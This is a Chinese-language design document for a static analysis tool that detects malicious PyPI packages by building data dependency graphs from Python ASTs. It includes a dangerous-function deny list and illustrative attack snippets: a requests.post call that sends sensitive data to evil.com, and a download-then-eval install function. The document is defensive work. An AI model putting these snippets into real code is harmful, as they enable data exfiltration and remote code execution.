# DDG生成器核心思想总结

**版本**: v1.2
**更新日期**: 2026-05-08
**项目**: PyPI恶意包静态检测系统

---

## 目录

1. [生成思想](#1-生成思想)
2. [怎么生成](#2-怎么生成)
3. [有什么类型](#3-有什么类型)
4. [什么策略](#4-什么策略)
5. [错误检测](#5-错误检测)
6. [代码规模说明](#6-代码规模说明)

---

## 1. 生成思想

### 1.1 核心理念

**在AST解析时，不仅要记录`def`本身，还要记录整个函数体**

传统方法的问题：
```python
# ❌ 传统做法：只记录函数定义行
def dangerous_func(cmd):
    eval(cmd)  # 危险操作

# 结果：只知道第1行有函数定义，不知道函数体有什么
```

我们的做法：
```python
# ✅ 我们的做法：记录完整函数体
def dangerous_func(cmd):
    eval(cmd)  # 危险操作

# 结果：记录整个函数体的所有语句
节点1: FunctionDef - dangerous_func (line 1)
节点2: Call - eval(cmd) (line 2)
边: 节点1 → 节点2 (函数体内)
```

### 1.2 核心算法：AST遍历

使用Python的`ast`模块遍历抽象语法树：

```
源代码 (Python)
    ↓
ast.parse() 解析
    ↓
AST抽象语法树
    ↓
自定义NodeVisitor遍历
    ↓
DDG节点和边
```

**关键点**：
- 遇到`FunctionDef` → 进入函数体，遍历所有语句
- 遇到`ClassDef` → 记录类，然后遍历所有方法
- 遇到`Call` → 检查是否是危险函数调用
- 遇到`Assign` → 记录变量定义和数据流

---

## 2. 怎么生成

### 2.1 核心流程

```python
class DFGVisitor(ast.NodeVisitor):
    """自定义AST访问器 - 核心生成逻辑"""

    def __init__(self, file_path, symbol_table):
        self.file_path = file_path
        self.symbol_table = symbol_table
        self.nodes = {}        # {(file, line, col): GlobalNode}
        self.edges = []        # [GlobalEdge]
        self.current_func = None   # 当前所在函数
        self.current_class = None  # 当前所在类

    def visit_FunctionDef(self, node):
        """✨ 核心：遇到函数定义时"""
        # 1. 记录函数定义节点
        func_node = self._create_node(
            node.lineno,
            'function',
            f"def {node.name}(...)"
        )

        # 2. 保存到符号表
        params = [arg.arg for arg in node.args.args]
        self.symbol_table.add_function(
            self.file_path,
            node.name,
            node.lineno,
            params,
            self.current_class
        )

        # 3. ✨ 关键：进入函数体，遍历所有语句
        old_func = self.current_func
        self.current_func = node.name

        # 递归遍历函数体
        for stmt in node.body:
            self.visit(stmt)

        # 4. 离开函数时恢复上下文
        self.current_func = old_func

    def visit_Call(self, node):
        """✨ 核心：遇到函数调用时"""
        # 1. 提取调用信息
        call_str = self._get_call_string(node)

        # 2. 创建调用节点
        call_node = self._create_node(
            node.lineno,
            'call',
            call_str,
            col_offset=node.col_offset
        )

        # 3. ✨ 检查是否是危险函数
        if self._is_dangerous_call(node):
            call_node.is_dangerous = True
            call_node.severity = self._get_severity(node)

            # 4. ✨ 追踪参数的数据来源
            self._trace_arguments(node)

        # 5. 继续遍历子节点（参数等）
        self.generic_visit(node)

    def visit_Assign(self, node):
        """✨ 核心：遇到赋值时"""
        # 1. 记录赋值语句
        assign_str = self._get_assign_string(node)
        assign_node = self._create_node(
            node.lineno,
            'assignment',
            assign_str
        )

        # 2. ✨ 建立数据流边
        if isinstance(node.value, ast.Call):
            # 赋值的右边是函数调用
            self._add_data_flow_edge(
                node.value.lineno,
                node.lineno,
                self._extract_var_name(node.targets[0])
            )
```

### 2.2 关键实现细节

#### 细节1：如何记录完整函数体？

```python
def visit_FunctionDef(self, node):
    """进入函数时"""
    # 步骤1: 创建函数定义节点
    func_node = self._create_node(
        node.lineno,
        'function',
        f"def {node.name}(...)"
    )

    # 步骤2: 保存函数上下文
    old_func = self.current_func
    old_class = self.current_class
    self.current_func = node.name
    self.current_class = self.current_class

    # 步骤3: ✨ 遍历函数体的每个语句
    for stmt in node.body:
        # 记录当前函数名到节点
        new_node = self.visit(stmt)
        if new_node:
            new_node.function_name = node.name
            new_node.class_name = self.current_class

    # 步骤4: 离开函数时恢复
    self.current_func = old_func
    self.current_class = old_class
```

#### 细节2：如何检测危险函数？

```python
DANGEROUS_FUNCTIONS = {
    'eval': 'critical',
    'exec': 'critical',
    'os.system': 'critical',
    'subprocess.Popen': 'critical',
    'requests.get': 'high',
    # ... 更多
}

def _is_dangerous_call(self, node):
    """检查是否是危险函数调用"""
    # 提取函数名
    func_name = self._get_full_function_name(node)

    # 检查是否在危险列表中
    for dangerous_func in DANGEROUS_FUNCTIONS:
        if func_name.startswith(dangerous_func):
            return True

    return False
```

#### 细节3：如何追踪数据流？

```python
def _trace_arguments(self, call_node):
    """追踪函数调用参数的数据来源"""
    # 假设调用：eval(user_input)

    # 步骤1: 提取参数
    args = call_node.args

    # 步骤2: 追踪每个参数
    for arg in args:
        if isinstance(arg, ast.Name):
            # 参数是变量：user_input
            var_name = arg.id

            # 步骤3: ✨ 反向查找变量的定义
            def_node = self._find_variable_definition(var_name)

            # 步骤4: 建立数据流边
            if def_node:
                edge = GlobalEdge(
                    def_node,           # from: user_input的定义
                    call_node,          # to: eval的调用
                    var_name,           # variable: user_input
                    function=self.current_func,
                    edge_type='data_dependency'
                )
                self.edges.append(edge)
```

#### 细节4：如何处理跨文件调用？

```python
def _handle_cross_file_call(self, call_node):
    """处理跨文件函数调用"""
    # 假设：module.func()

    # 步骤1: 提取模块名和函数名
    module_name = 'module'
    func_name = 'func'

    # 步骤2: 在符号表中查找函数定义
    func_info = self.symbol_table.get_function(
        f'{module_name}.py',
        func_name
    )

    # 步骤3: ✨ 建立跨文件边
    if func_info:
        edge = GlobalEdge(
            call_node,
            func_info['node'],
            variable='return_value',
            function=func_name,
            edge_type='cross_file'  # ✨ 跨文件标记
        )
        self.edges.append(edge)
```

---

## 3. 有什么类型

### 3.1 节点类型 (Node Types)

| 节点类型 | AST节点 | 描述 | 示例 |
|---------|---------|------|------|
| **function** | FunctionDef | 函数定义 | `def func():` |
| **class** | ClassDef | 类定义 | `class MyClass:` |
| **assignment** | Assign | 变量赋值 | `x = 1` |
| **call** | Call | 函数调用 | `func()` |
| **import** | Import | 导入语句 | `import os` |
| **return** | Return | 返回语句 | `return x` |
| **control_flow** | If/For/While | 控制流 | `if x:` |

### 3.2 边类型 (Edge Types)

| 边类型 | 描述 | 示例 |
|-------|------|------|
| **data_dependency** | 数据依赖边 | `x = 1; y = x` |
| **control_dependency** | 控制依赖边 | `if cond: func()` |
| **function_call** | 函数调用边 | `func()` |
| **cross_file** | 跨文件边 | `module.func()` |

### 3.3 危险级别 (Severity Levels)

| 级别 | 描述 | 危险函数数 | 示例 |
|------|------|-----------|------|
| **critical** | 严重 | 8+ nodes | eval, exec, os.system |
| **high** | 高危 | 4-7 nodes | requests.get, pickle.loads |
| **medium** | 中等 | 1-3 nodes | open, os.getenv |

---

## 4. 什么策略

### 4.1 函数内数据流追踪

**目标**：追踪函数内的变量定义和使用

**策略**：
```python
# 示例代码
def dangerous_func(cmd):
    x = cmd           # 语句1
    result = eval(x)  # 语句2：危险！
    return result

# 追踪结果
节点1: assignment - x = cmd (line 2)
节点2: call - eval(x) (line 3)
边: 节点1 → 节点2 (变量: x)
```

**实现**：
```python
def visit_Assign(self, node):
    """处理赋值语句"""
    # 右边是变量引用
    if isinstance(node.value, ast.Name):
        source_var = node.value.id

    # 左边是变量定义
    target_var = node.targets[0].id

    # 建立数据流边：source_var → target_var
    self._add_data_flow_edge(
        source_var,
        target_var,
        self.current_func
    )
```

### 4.2 函数间数据流追踪

**目标**：追踪函数调用时的参数传递

**策略**：
```python
# 示例代码
def caller():
    cmd = get_input()      # 获取输入
    dangerous_func(cmd)    # 调用危险函数

def dangerous_func(cmd):
    eval(cmd)              # 危险操作

# 追踪结果
跨文件边: caller.cmd → dangerous_func.cmd
边: dangerous_func.cmd → eval的参数
```

**实现**：
```python
def visit_Call(self, node):
    """处理函数调用"""
    # 获取被调用函数的信息
    func_name = self._get_function_name(node)

    # 获取调用参数
    args = node.args

    # 在符号表中查找函数定义
    func_info = self.symbol_table.get_function(
        self.file_path,
        func_name,
        self.current_class
    )

    if func_info:
        # ✨ 建立参数传递边
        for i, arg in enumerate(args):
            if i < len(func_info['params']):
                param_name = func_info['params'][i]

                # 建立数据流：实参 → 形参
                self._add_parameter_edge(
                    arg,           # 实参（调用时的参数）
                    param_name,    # 形参（函数定义的参数）
                    func_name
                )
```

### 4.3 跨文件数据流追踪

**目标**：追踪import后的函数调用

**策略**：
```python
# file1.py
import file2

def caller():
    cmd = "evil"
    file2.dangerous(cmd)  # 跨文件调用

# file2.py
def dangerous(cmd):
    eval(cmd)  # 危险操作

# 追踪结果
跨文件边: file1.caller.cmd → file2.dangerous.cmd
边: file2.dangerous.cmd → eval的参数
```

**实现**：
```python
def _handle_import(self, import_node):
    """处理import语句"""
    # 记录import信息
    module_name = import_node.names[0].name
    self.imports.add(module_name)

def visit_Call(self, node):
    """处理函数调用"""
    func_name = self._get_function_name(node)

    # 检查是否是跨文件调用
    if '.' in func_name:
        module_name, func = func_name.split('.', 1)

        # ✨ 查找被调用模块
        if module_name in self.imports:
            # 建立跨文件边
            self._add_cross_file_edge(
                self.file_path,
                f'{module_name}.py',
                func
            )
```

### 4.4 危险函数检测策略

**检测库**：
```python
DANGEROUS_FUNCTIONS = {
    # 代码执行 (critical)
    'eval': 'critical',
    'exec': 'critical',
    'compile': 'critical',

    # 命令执行 (critical)
    'os.system': 'critical',
    'os.popen': 'critical',
    'subprocess.run': 'critical',
    'subprocess.Popen': 'critical',

    # 网络操作 (high)
    'requests.get': 'high',
    'requests.post': 'high',
    'urllib.request.urlopen': 'high',

    # 文件操作 (medium)
    'open': 'medium',
    'os.remove': 'medium',
}
```

**检测逻辑**：
```python
def _is_dangerous_call(self, node):
    """检查是否是危险函数调用"""
    func_name = self._get_full_function_name(node)

    # 遍历危险函数库
    for dangerous_func, severity in DANGEROUS_FUNCTIONS.items():
        if func_name.startswith(dangerous_func):
            return True, severity

    return False, None
```

---

## 5. 错误检测

### 5.1 检测什么错误？

**1. 危险函数调用**
```python
# 示例
eval(user_input)  # ❌ 危险：代码注入
os.system(cmd)    # ❌ 危险：命令执行
```

**检测方法**：
```python
def check_dangerous_calls(code):
    """检测危险函数调用"""
    # 在visit_Call中检测
    if self._is_dangerous_call(node):
        # 记录危险节点
        node.is_dangerous = True
        node.severity = 'critical'

        # 添加到安全报告
        self.security_report.add_finding({
            'type': 'dangerous_call',
            'function': func_name,
            'line': node.lineno,
            'severity': 'critical'
        })
```

**2. 数据泄露**
```python
# 示例
def exfil():
    data = get_sensitive_data()  # 获取敏感数据
    requests.post('https://evil.com', data=data)  # ❌ 泄露
```

**检测方法**：
```python
def check_data_exfil(node):
    """检测数据泄露"""
    func_name = self._get_function_name(node)

    # 检查是否是网络请求
    if func_name in ['requests.post', 'requests.get']:
        # 追踪参数的数据来源
        args = self._trace_arguments(node)

        # 检查参数是否包含敏感数据
        for arg in args:
            if self._is_sensitive_data(arg):
                # 发现数据泄露
                self.security_report.add_finding({
                    'type': 'data_exfiltration',
                    'function': func_name,
                    'line': node.lineno,
                    'severity': 'high'
                })
```

**3. 异常处理缺陷**
```python
# 示例
try:
    eval(user_input)  # 危险操作
except:
    pass  # ❌ 吞掉所有异常

# 或者
eval(user_input)  # ❌ 没有异常处理
```

**检测方法**：
```python
def check_exception_handling(node):
    """检测异常处理"""
    # 检查是否有try-except
    has_try = self._has_parent(node, ast.Try)

    if not has_try:
        # 没有异常处理
        self.security_report.add_finding({
            'type': 'missing_exception_handling',
            'function': func_name,
            'line': node.lineno,
            'severity': 'medium'
        })

    if has_try:
        # 检查是否是裸except
        except_handler = self._get_except_handler(node)
        if except_handler and except_handler.type is None:
            # 裸except：吞掉所有异常
            self.security_report.add_finding({
                'type': 'bare_except',
                'line': except_handler.lineno,
                'severity': 'medium'
            })
```

### 5.2 如何才算检测到错误？

**标准1：发现危险函数调用**
```python
# 条件
if node.is_dangerous and node.severity in ['critical', 'high']:
    return True, 'dangerous_call'
```

**标准2：发现完整的数据流路径**
```python
# 条件
path = self._build_data_flow_path(dangerous_node)
if len(path) > 1:  # 至少有2个节点
    return True, 'complete_data_flow'
```

**标准3：发现攻击链**
```python
# 条件
chain = self._extract_attack_chain(dangerous_node)
if len(chain['functions']) > 1:  # 至少涉及2个函数
    return True, 'attack_chain'
```

**标准4：发现可疑模式**
```python
# 条件
patterns = [
    'base64_encoded_string',
    'powershell_encoded_command',
    'suspicious_domain',
    'obfuscated_code'
]
if any(self._match_pattern(code, p) for p in patterns):
    return True, 'suspicious_pattern'
```

### 5.3 检测流程

```
DDG构建
    ↓
识别危险节点
    ↓
BFS反向追踪数据流
    ↓
检查是否到达外部输入
    ↓
判断是否构成攻击链
    ↓
生成安全报告
```

**示例**：
```python
# 代码
def install():
    url = get_url()  # 外部输入
    cmd = download(url)  # 下载恶意代码
    eval(cmd)  # 危险执行

# 检测过程
1. ✅ 发现危险节点：eval() (line 4)
2. ✅ 反向追踪：eval ← cmd ← url ← get_url()
3. ✅ 发现外部输入：get_url()
4. ✅ 构建攻击链：install → download → eval
5. ✅ 生成报告：CRITICAL级别
```

---

## 6. 代码规模说明

### 6.1 为什么代码这么长？

**原因1：需要处理所有AST节点类型**

```python
# Python AST有30+种节点类型
def visit_Assign(self, node):        # 赋值
def visit_Call(self, node):          # 函数调用
def visit_FunctionDef(self, node):   # 函数定义
def visit_ClassDef(self, node):      # 类定义
def visit_Import(self, node):        # import
def visit_Return(self, node):        # return
def visit_If(self, node):            # if语句
def visit_For(self, node):           # for循环
def visit_While(self, node):         # while循环
def visit_Try(self, node):           # try-except
def visit_With(self, node):          # with语句
def visit_ListComp(self, node):      # 列表推导
def visit_Lambda(self, node):        # lambda
# ... 还有很多
```

**原因2：需要处理复杂的Python语义**

```python
# 需要理解：
- 函数定义和调用
- 类和继承
- 闭包和作用域
- 装饰器
- 生成器和迭代器
- 异步函数
- 各种import方式
- ... Python的复杂特性
```

**原因3：需要追踪跨文件数据流**

```python
# file1.py
import file2
from file3 import func

def caller():
    x = file2.func()  # 跨文件调用
    y = func(x)       # 跨文件调用

# 需要处理：
- 符号表构建
- 跨文件边连接
- 循环import检测
- 相对import处理
```

**原因4：需要处理大量边界情况**

```python
# 边界情况：
- Windows vs Linux路径
- Python 2 vs Python 3
- 各种编码格式
- 各种异常情况
- 各种代码风格
```

**原因5：需要实现多种检测策略**

```python
# 检测策略：
- 危险函数检测 (50+ 函数)
- 数据流追踪 (BFS/DFS)
- 攻击链提取 (图算法)
- 混淆检测 (模式匹配)
- 域名检测 (正则表达式)
```

### 6.2 代码统计

| 文件 | 行数 | 主要功能 |
|------|------|---------|
| **ddg_builder_v7.py** | ~2500 | DDG构建器（核心） |
| **simple_stub_generator.py** | ~1300 | 桩程序生成器 |
| **graph_partitioner.py** | ~500 | 图分割算法 |
| **call_graph_analyzer.py** | ~600 | 调用图分析 |
| **visualizer_v7.py** | ~300 | 可视化工具 |
| **总计** | ~6000 | 核心代码 |

### 6.3 核心代码占比

```
DDG构建逻辑:      40% (约2400行)
  - AST遍历:     1000行
  - 数据流追踪:   800行
  - 符号表构建:   400行
  - 危险检测:     200行

桩程序生成逻辑:    30% (约1800行)
  - 数据合成:     600行
  - 代码生成:     800行
  - 依赖处理:     400行

图分割逻辑:       20% (约1200行)
  - WCC算法:      300行
  - BFS算法:      400行
  - HYBRID算法:   500行

其他:             10% (约600行)
  - 可视化:       300行
  - 工具函数:     300行
```

---

## 附录：核心代码示例

### A. AST遍历核心代码

```python
class DFGVisitor(ast.NodeVisitor):
    """AST遍历器 - 核心生成逻辑"""

    def __init__(self, file_path, symbol_table):
        self.nodes = {}
        self.edges = []
        self.current_func = None
        self.current_class = None

    def visit_FunctionDef(self, node):
        """处理函数定义 - 进入函数体"""
        # 保存上下文
        old_func = self.current_func
        self.current_func = node.name

        # ✨ 遍历函数体的所有语句
        for stmt in node.body:
            self.visit(stmt)

        # 恢复上下文
        self.current_func = old_func

    def visit_Call(self, node):
        """处理函数调用 - 检测危险函数"""
        # 检查是否危险
        if self._is_dangerous_call(node):
            # 标记危险节点
            call_node = self._create_node(...)
            call_node.is_dangerous = True

            # 追踪参数来源
            self._trace_arguments(node)

        # 继续遍历
        self.generic_visit(node)

    def visit_Assign(self, node):
        """处理赋值 - 建立数据流"""
        # 建立数据流边
        self._add_data_flow_edge(...)
```

### B. 数据流追踪核心代码

```python
def _trace_arguments(self, call_node):
    """追踪函数参数的数据来源"""
    args = call_node.args

    for arg in args:
        if isinstance(arg, ast.Name):
            # 参数是变量
            var_name = arg.id

            # 反向查找变量定义
            def_node = self._find_variable_definition(var_name)

            # 建立数据流边
            if def_node:
                edge = GlobalEdge(
                    def_node,
                    call_node,
                    var_name,
                    self.current_func,
                    'data_dependency'
                )
                self.edges.append(edge)
```

### C. 危险检测核心代码

```python
def _is_dangerous_call(self, node):
    """检查是否是危险函数调用"""
    func_name = self._get_full_function_name(node)

    DANGEROUS_FUNCTIONS = {
        'eval': 'critical',
        'exec': 'critical',
        'os.system': 'critical',
        # ... 更多
    }

    for dangerous_func, severity in DANGEROUS_FUNCTIONS.items():
        if func_name.startswith(dangerous_func):
            return True, severity

    return False, None
```

---

**文档更新**: 2026-05-08
**版本**: v1.2
**作者**: 根据用户提供的思路图整理
